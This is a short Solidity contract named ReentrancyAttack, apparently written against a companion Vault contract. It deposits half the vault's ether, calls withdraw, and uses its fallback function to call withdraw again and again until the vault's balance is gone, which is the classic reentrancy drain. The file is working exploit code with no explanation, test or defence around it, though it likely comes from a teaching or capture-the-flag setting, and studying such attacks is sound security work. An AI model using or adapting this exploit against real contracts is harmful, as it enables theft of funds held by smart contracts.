// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "./Vault.sol";

contract ReentrancyAttack {
    Vault public v;
    uint amount;

    constructor(Vault _v) {
        v = _v;
    }

    function attack() public payable {
        amount = (address(v).balance) / 2;
        v.deposit{value: amount}();
        v.withdraw(amount);
    }

    fallback() external payable {
        if (address(v).balance > 0) {
            v.withdraw(amount);
        }
    }
}
